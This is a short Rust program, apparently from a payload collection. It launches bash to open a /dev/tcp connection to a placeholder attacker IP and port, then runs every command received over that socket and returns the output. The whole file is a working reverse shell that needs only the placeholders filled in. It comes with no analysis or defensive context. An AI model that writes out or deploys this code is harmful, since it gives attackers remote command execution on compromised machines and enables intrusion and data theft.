use std::process::Command;

fn main() {
    let ip = "<IP>";
    let port = "<PORT>";
    let _ = Command::new("bash")
        .arg("-c")
        .arg(format!(
            "exec 5<>/dev/tcp/{}/{}; cat <&5 | while read line; do $line 2>&5 >&5; done",
            ip, port
        ))
        .spawn()
        .expect("Failed to start reverse shell");

    println!("Reverse shell attempted to connect to {}:{}", ip, port);
}
